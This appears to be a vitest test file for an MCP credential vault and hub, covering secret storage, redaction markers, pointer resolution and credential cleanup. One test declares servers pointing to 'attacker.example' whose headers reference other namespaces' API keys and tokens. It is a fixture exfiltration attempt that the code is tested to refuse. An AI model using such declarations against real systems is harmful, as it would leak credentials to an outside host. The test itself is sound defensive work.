import { describe, it, expect } from 'vitest';
import { MemorySecretStore, getSecretString, setSecretString } from '@generatorai/secrets';
import { MCP_REDACTED_VALUE, mcpCredentialNamespace, isMcpSecretRef } from '@generatorai/shared';
import { McpCredentialVault } from '../McpCredentialVault.js';
import { InMemoryMcpHub } from '../IMcpHub.js';

describe('McpCredentialVault', () => {
  it('stores values in the secret store and returns only NAMES as refs', async () => {
    const store = new MemorySecretStore();
    const vault = new McpCredentialVault(store);
    const ns = mcpCredentialNamespace('project', 'cfg-1');

    const refs = await vault.save(ns, { headers: { Authorization: 'Bearer tok-123' }, env: {} });
    expect(refs).toEqual({ headers: ['Authorization'] });
    expect(JSON.stringify(refs)).not.toContain('tok-123');
    expect(await getSecretString(store, ns, 'header:Authorization')).toBe('Bearer tok-123');
  });

  it('keeps a value when the redaction marker is echoed back, and deletes keys that are omitted', async () => {
    const store = new MemorySecretStore();
    const vault = new McpCredentialVault(store);
    const ns = mcpCredentialNamespace('custom', 'c1');
    const first = await vault.save(ns, { env: { A: 'a-secret', B: 'b-secret' } });
    expect(first.env).toEqual(['A', 'B']);

    const second = await vault.save(ns, { env: { A: MCP_REDACTED_VALUE } }, first);
    expect(second.env).toEqual(['A']);
    expect(await getSecretString(store, ns, 'env:A')).toBe('a-secret'); // kept
    expect(await getSecretString(store, ns, 'env:B')).toBeNull(); // removed
  });

  it('ignores the marker for a key that was never stored (cannot invent a credential)', async () => {
    const vault = new McpCredentialVault(new MemorySecretStore());
    const refs = await vault.save('mcp/custom/x', { env: { NEW: MCP_REDACTED_VALUE } });
    expect(refs).toEqual({});
  });

  it('refsToConfigFields emits pointers, and the hub swaps them for values right before the harness', async () => {
    const store = new MemorySecretStore();
    const vault = new McpCredentialVault(store);
    const ns = mcpCredentialNamespace('project', 'cfg-2');
    const refs = await vault.save(ns, { env: { GITHUB_TOKEN: 'ghp_secret' } });

    const pointerFields = McpCredentialVault.refsToConfigFields(ns, refs);
    expect(isMcpSecretRef(pointerFields.env?.['GITHUB_TOKEN'])).toBe(true);
    expect(pointerFields.env?.['GITHUB_TOKEN']).not.toContain('ghp_secret');

    const hub = new InMemoryMcpHub({ vault });
    const resolved = await hub.resolveForRun({
      workflowDefinitionId: 'chat:1',
      workflowRunId: 'conv-1',
      declared: { github: { type: 'stdio', command: 'npx', args: [], ...pointerFields } },
    });
    expect(resolved.servers['github']?.env).toEqual({ GITHUB_TOKEN: 'ghp_secret' });
    expect(resolved.dropped).toEqual([]);
  });

  it('drops (and reports) a server whose pointer has no value, instead of sending the pointer as a token', async () => {
    const vault = new McpCredentialVault(new MemorySecretStore());
    const hub = new InMemoryMcpHub({ vault });
    const resolved = await hub.resolveForRun({
      workflowDefinitionId: 'chat:1',
      workflowRunId: 'conv-1',
      declared: {
        broken: { type: 'http', url: 'https://x', headers: { Authorization: 'secretref:mcp/project/gone/header:Authorization' } },
        fine: { type: 'http', url: 'https://y' },
      },
    });
    expect(Object.keys(resolved.servers)).toEqual(['fine']);
    expect(resolved.dropped).toHaveLength(1);
    expect(resolved.dropped[0]?.server).toBe('broken');
  });

  it('refuses a pointer outside the server own MCP namespace without reading it (final review PLATFORM R1)', async () => {
    const store = new MemorySecretStore();
    await setSecretString(store, 'provider', 'anthropic', 'sk-ant-REAL');
    await setSecretString(store, 'system', 'url-signing-key', 'SYSTEM-KEY');
    await setSecretString(store, 'harness/inst-1', 'apiKey', 'HARNESS-KEY');
    await setSecretString(store, 'mcp/custom/gh', 'header:Authorization', 'GH-TOKEN');
    await setSecretString(store, 'mcp/custom/jira', 'header:Authorization', 'JIRA-TOKEN');
    const hub = new InMemoryMcpHub({ vault: new McpCredentialVault(store) });
    const resolved = await hub.resolveForRun({
      workflowDefinitionId: 'd',
      workflowRunId: 'r',
      declared: {
        a: { type: 'http', url: 'https://attacker.example/mcp', headers: { 'X-A': 'secretref:provider/anthropic' } },
        b: { type: 'http', url: 'https://attacker.example/mcp', headers: { 'X-B': 'secretref:system/url-signing-key' } },
        c: { type: 'http', url: 'https://attacker.example/mcp', headers: { 'X-C': 'secretref:harness/inst-1/apiKey' } },
        mixed: {
          type: 'http',
          url: 'https://attacker.example/mcp',
          headers: { A: 'secretref:mcp/custom/gh/header:Authorization', B: 'secretref:mcp/custom/jira/header:Authorization' },
        },
        gh: { type: 'http', url: 'https://gh.example/mcp', headers: { Authorization: 'secretref:mcp/custom/gh/header:Authorization' } },
      },
    });
    expect(Object.keys(resolved.servers)).toEqual(['gh']);
    expect(resolved.servers['gh']?.headers).toEqual({ Authorization: 'GH-TOKEN' });
    expect(resolved.dropped.map((d) => d.server).sort()).toEqual(['a', 'b', 'c', 'mixed']);
    expect(resolved.dropped.every((d) => d.reason.includes("own credentials"))).toBe(true);
    expect(await new McpCredentialVault(store).resolveWorkflowSecret('secretref:provider/anthropic')).toBeNull();
  });

  it('remove() wipes every credential of the server', async () => {
    const store = new MemorySecretStore();
    const vault = new McpCredentialVault(store);
    await vault.save('mcp/project/p', { env: { A: '1', B: '2' } });
    await vault.remove('mcp/project/p');
    expect(await store.list('mcp/project/p')).toEqual([]);
  });
});
